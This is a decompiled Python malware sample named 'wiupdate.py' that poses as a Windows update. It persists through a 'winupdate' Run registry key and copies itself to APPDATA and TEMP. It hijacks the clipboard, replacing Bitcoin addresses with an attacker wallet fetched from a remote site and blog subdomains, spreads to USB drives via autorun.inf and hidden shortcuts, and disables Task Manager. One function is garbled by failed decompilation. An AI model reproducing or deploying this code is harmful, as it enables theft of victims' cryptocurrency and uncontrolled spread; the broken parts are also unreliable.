# Decompiled with PyLingual (https://pylingual.io)
# Internal filename: 'wiupdate.py'
# Bytecode version: 3.9.0beta5 (3425)
# Source timestamp: 1970-01-01 00:00:00 UTC (0)

from cryptography.fernet import Fernet
from winreg import *
from shutil import copyfile
from datetime import datetime
import re
import win32event
import winerror
import win32api
import win32clipboard
import wmi
import shutil
import sys
import subprocess
import pathlib
import requests
import time
import os
global FindServerTime
global respData


def wlog(text):
    LogWriter = False
    if LogWriter:
        with open('log.txt', 'a+') as file_object:
            file_object.write(text + '\n')


wlog('Start Project')
wlog('Load Module Finish')
mutex = win32event.CreateMutex(None, 1, 'PA_mutex_xp4')
if win32api.GetLastError() == winerror.ERROR_ALREADY_EXISTS:
    mutex = None
    sys.exit(0)
wlog('After Multi Run')
strPath = os.path.realpath(sys.argv[0])
wlog('strPath Set.')
blog_name = ''
FindServerTime = 1000
respData = ''
wlog('before detectSandboxie')


def detectSandboxie():
    try:
        ctypes.windll.LoadLibrary('SbieDll.dll')
    except Exception:
        return False
    return True


wlog('after detectSandboxie')


def detectVM():
    objWMI = wmi.WMI()
    for objDiskDrive in objWMI.query('Select * from Win32_DiskDrive'):
        if 'vbox' in objDiskDrive.Caption.lower() or 'virtual' in objDiskDrive.Caption.lower():
            return True
    return False


wlog('after detectVM and before encryptBlg')


def encryptBlg(message):
    newS = ''
    for car in message:
        newS = newS + chr(ord(car) + 17)
    return newS.lower()


wlog('before decryptBlg')


def decryptBlg(message):
    message = message.replace('?', '.')
    message = message.replace('b', '1')
    message = message.replace('c', '2')
    message = message.replace('d', '3')
    message = message.replace('e', '4')
    message = message.replace('f', '5')
    message = message.replace('g', '6')
    message = message.replace('h', '7')
    message = message.replace('i', '8')
    message = message.replace('j', '9')
    message = message.replace('a', '0')
    return message.lower()


wlog('before startup')


def startup(onstartup):
    try:
        strAppPath = os.path.join(
            os.environ['APPDATA'], os.path.basename(strPath))
        if not os.getcwd() == os.environ['APPDATA']:
            copyfile(strPath, strAppPath)
        objRegKey = OpenKey(
            HKEY_CURRENT_USER, 'Software\\Microsoft\\Windows\\CurrentVersion\\Run', 0, KEY_ALL_ACCESS)
        SetValueEx(objRegKey, 'winupdate', 0, REG_SZ, strAppPath)
        CloseKey(objRegKey)
        strTempPath = os.path.join(
            os.environ['TEMP'] + '\\winupdate', os.path.basename(strPath))
        if not os.getcwd() == os.environ['TEMP'] + '\\winupdate':
            copyfile(strPath, strTempPath)
    except WindowsError:
        if not onstartup:
            print('Unable to add to startup!')
    else:
        if not onstartup:
            print('success')


wlog('9')


def tempFile():
    wlog('10')
    try:
        if not (os.getcwd() == os.environ['TEMP'] + '\\winupdate' or os.getcwd() == os.environ['APPDATA']):
            if not os.path.exists(os.environ['TEMP'] + '\\winupdate'):
                wlog('empty Temp winupdate (Folder winupdate not found !)')
                os.makedirs(os.environ['TEMP'] + '\\winupdate')
            wlog('after Crate Folder winupdate')
            winupdate = os.path.join(os.environ['TEMP'], 'winupdate')
            wlog('after Join To Folder winupdate')
            if os.path.isfile(os.path.join(os.environ['TEMP'] + '\\winupdate\\', os.path.basename(sys.argv[0]))) == False:
                wlog('os.path.isfile is False')
                wlog('os.path.join(winupdate, os.path.basename(sys.argv[0])) ')
                strAppPath = os.path.join(
                    os.environ['TEMP'], os.path.basename(strPath))
                if not os.getcwd() == os.environ['TEMP']:
                    copyfile(strPath, strAppPath)
                wlog('copyfile to \\winupdate')
                wlog(
                    'after os.system(os.environ[\'TEMP\']+\"\\winupdate\\\"+os.path.basename(sys.argv[0]))')
            wlog('tempFile RUN ->> sys.exit(0)')
            sys.exit(0)
    except:
        wlog('except TempFile !!!!!!!!!!!!!')


wlog('Befor tempFile()')
tempFile()
wlog('Afther tempFile()')
startup(True)
wlog('After startup(True)')


def check_internet():
    url = 'https://www.google.com/'
    timeout = 5
    try:
        request = requests.get(url, timeout=timeout)
        return True
    except (requests.ConnectionError, requests.Timeout) as exception:
        return False


wlog('26')


def CreateShortcut(lnk_name, Path):
    shell = Dispatch('WScript.Shell')
    shortcut = shell.CreateShortCut(os.path.join(Path, lnk_name + '.lnk'))
    winpath = os.environ['WINDIR'] + '\\System32\\'
    shortcut.Targetpath = winpath + '\\cmd.exe '
    args = ['%comspec% /c ' +
            os.path.basename(sys.argv[0]), Path + '\\' + lnk_name]
    shortcut.Arguments = ' '.join(args)
    shortcut.Description = 'shortcut'
    shortcut.IconLocation = 'shell32.dll,4'
    shortcut.save()


wlog('27')


def decryptPriv(encryped):
    encrypted = encryped.encode()
    f = Fernet('-zlOqEUi2itii1JoKHl-TqupkDZfhLpRjWsI0xRuGrg=')
    decrypted = f.decrypt(encrypted)
    return decrypted


wlog('28')


def find_server_ip(BotRequest=''):
    # irreducible cflow, using cdg fallback
    global respData
    global FindServerTime
    # ***<module>.find_server_ip: Failure: Compilation Error
    print('find_server_ip')
    blog_name = encryptBlg(datetime.today().strftime('%Y%m%d'))
    blog01 = 'http://wallpaperaccess.ir/access.txt'
    blog02 = 'http://' + blog_name + '.blogfa.com'
    blog03 = 'http://' + blog_name + '.blogsky.com'
    blog04 = 'http://' + blog_name + '.takblog.net/rss.xml'
    blog05 = 'http://' + blog_name + '.photoblog.com'
    blog06 = 'http://' + blog_name + '.creerunblog.fr'
    blog07 = 'http://' + blog_name + '.samenblog.com'
    blog08 = 'http://' + blog_name + '.niloblog.com'
    blog09 = 'http://' + blog_name + '.loxblog.com'
    blog10 = 'http://' + blog_name + '.niniweblog.com'
    blog11 = 'http://' + blog_name + '.parsiblog.com'
    blog12 = 'http://' + blog_name + '.persianblog.ir'
    blog13 = 'http://' + blog_name + '.weebly.com'
    blog14 = 'http://' + blog_name + '.wordpress.com'
    blog15 = 'http://' + blog_name + '.blogger.com'
    list = [blog01, blog02, blog03, blog04, blog05, blog06, blog07,
            blog08, blog09, blog10, blog11, blog12, blog13, blog14, blog15]
    print('Before Loop For Start ...')
    for blogName in list:
        print('In Loop For Start ...')
        m = ''
        result = ''
          print(blogName)
           if check_internet():
                currentTime = time.time() - FindServerTime
                if currentTime > 60 or respData == '':
                    response = ''
                    response = requests.get(blogName, timeout=5)
                    respData = response.text
                    FindServerTime = time.time()
                else:
                    respData = respData
                    FindServerTime = FindServerTime
                if BotRequest == 'BTCWallet':
                    m = re.search('#0bw0#(.+?)#0bw0#', respData)
                    if m:
                        result = m.group(1)
                    result = decryptPriv(result).decode()
                    if result == '':
                        FindServerTime = 1000
                    result = ''
                    FindServerTime = 1000
            result = ''
            FindServerTime = 1000
            print('Error find_server_ip')
    print('Find Wallet : ' + result)
    return result


wlog('before BTCWalletInject():')


def BTCWalletInject():
    if check_internet():
        wlog('if BTCWalletInject() -> check_internet():')
        win32clipboard.OpenClipboard(0)
        wlog('[Ok] win32clipboard.OpenClipboard()')
        try:
            data = win32clipboard.GetClipboardData()
            wlog(
                '[Ok] win32clipboard.GetClipboardData() -> Get Clipboard Data is : ' + data)
        except TypeError:
            data = ''
            wlog('win32clipboard.GetClipboardData() #non-text')
        win32clipboard.CloseClipboard()
        wlog('[Ok] win32clipboard.CloseClipboard()')
        wlog('Clipboard Data is : ' + data)
        if (len(data) == 33 or len(data) == 34 or len(data) == 42) and data != '':
            wlog('if len(data)==33 or len(data)==34 or len(data)==42 :')
            MyWallet = find_server_ip('BTCWallet')
            wlog('MyWallet = find_server_ip(\"BTCWallet\")')
            wlog('MyWallet is : \'' + MyWallet + '\'')
            print('MyWallet is : \'' + MyWallet + '\'')
            if MyWallet != data and MyWallet != '':
                wlog('if MyWallet != data and MyWallet != \"\" :')
                win32clipboard.OpenClipboard()
                wlog('win32clipboard.OpenClipboard()')
                win32clipboard.EmptyClipboard()
                wlog('win32clipboard.EmptyClipboard()')
                win32clipboard.SetClipboardText(MyWallet)
                wlog('win32clipboard.SetClipboardText(MyWallet) : ' + MyWallet)
                win32clipboard.CloseClipboard()
                wlog('win32clipboard.CloseClipboard()')
    else:
        wlog('disconnect (BTC Wallet Inject break ....)')


wlog('after BTCWalletInject():')


def LoopClient():
    try:
        strComputer = '.'
        objWMIService = win32com.client.Dispatch('WbemScripting.SWbemLocator')
        objSWbemServices = objWMIService.ConnectServer(
            strComputer, 'root\\cimv2')
        colItems = objSWbemServices.ExecQuery(
            'SELECT * FROM Win32_DiskDrive WHERE InterfaceType = \"USB\"')
        DiskDrive_DeviceID = colItems[0].DeviceID.replace(
            '\\', '').replace('.', '')
        DiskDrive_Caption = colItems[0].Caption
        colItems = objSWbemServices.ExecQuery(
            'SELECT * from Win32_DiskDriveToDiskPartition')
        for objItem in colItems:
            if DiskDrive_DeviceID in str(objItem.Antecedent):
                DiskPartition_DeviceID = objItem.Dependent.split('=')[
                    1].replace('\"', '')
        colItems = objSWbemServices.ExecQuery(
            'SELECT * from Win32_LogicalDiskToPartition')
        for objItem in colItems:
            if DiskPartition_DeviceID in str(objItem.Antecedent):
                LogicalDisk_DeviceID = objItem.Dependent.split('=')[
                    1].replace('\"', '')
        colItems = objSWbemServices.ExecQuery(
            'SELECT * from Win32_LogicalDisk WHERE DeviceID=\"' + LogicalDisk_DeviceID + '\"')
        f = open(str(LogicalDisk_DeviceID) + '\\autorun.inf', 'w')
        f.write('[autorun]\n')
        f.write('open=' + os.path.basename(sys.argv[0]) + ' \n')
        f.write('icon=' + os.path.basename(sys.argv[0]) + ',0 \n')
        f.write('label=click to Open\n')
        f.write('\n')
        f.write('[Content]\n')
        f.write('MusicFiles=false\n')
        f.write('PictureFiles=false\n')
        f.write('VideoFiles=false')
        f.close()
        try:
            os.unlink(os.path.basename(sys.argv[0]), os.path.join(
                str(LogicalDisk_DeviceID), os.path.basename(sys.argv[0])))
        except:
            pass
        try:
            shutil.copy(os.path.basename(sys.argv[0]), os.path.join(
                str(LogicalDisk_DeviceID), os.path.basename(sys.argv[0])))
        except:
            pass
    except:
        pass
    try:
        path = LogicalDisk_DeviceID
        dirs = os.listdir(LogicalDisk_DeviceID)
        for file in dirs:
            if len(file.split('.')) == 1:
                CreateShortcut(file.split('.')[0], path)
            else:
                if len(file.split('.')) == 2 and (file.split('.')[1] != 'inf' or file.split('.')[1] != 'dir' or file.split('.')[1] == 'exe'):
                    CreateShortcut(file.split('.')[0], path)
            if len(file.split('.')) == 1 or file.split('.')[1] != 'lnk':
                os.system('attrib +r +h +s ' + os.path.join(path + file))
    except:
        pass
    time.sleep(2)


wlog('after def LoopClient():')


def vbs_block_process(process, popup=False):
    strVBSCode = 'On Error Resume Next\nSet objWshShl = WScript.CreateObject(\"WScript.Shell\")\nSet objWMIService = GetObject(\"winmgmts:\" & \"{impersonationLevel=impersonate}!//./root/cimv2\")\nSet colMonitoredProcesses = objWMIService.ExecNotificationQuery(\"select * from __instancecreationevent \" & \" within 1 where TargetInstance isa \'Win32_Process\'\")\nDo\nSet objLatestProcess = colMonitoredProcesses.NextEvent\n' + f'If LCase(objLatestProcess.TargetInstance.Name) = \"{
        process}\" Then\n' + 'objLatestProcess.TargetInstance.Terminate\n'
    if popup:
        strVBSCode += f'objWshShl.Popup \"{popup[0]
                                           }\", {popup[2]}, \"{popup[1]}\", {popup[3]}\n'
    strVBSCode += 'End If\nLoop'
    strScript = os.path.join(os.environ['TEMP'], 'd.vbs')
    with open(strScript, 'w') as objVBSFile:
        objVBSFile.write(strVBSCode)
    subprocess.Popen(['cscript', strScript], stdout=subprocess.PIPE,
                     stderr=subprocess.PIPE, stdin=subprocess.PIPE, shell=True)


wlog('after def vbs_block_process(process, popup=False):')


def disable_taskmgr():
    popup = ['Task Manager has been disabled by your administrator',
             'Task Manager', '3', '16']
    vbs_block_process('taskmgr.exe', popup=popup)
    return '[Disable] task manager'


disable_taskmgr()
wlog('after def disable_taskmgr():')
if __name__ == '__main__':
    wlog('Start Main While Loop')
    while True:
        time.sleep(1)
        BTCWalletInject()
        LoopClient()
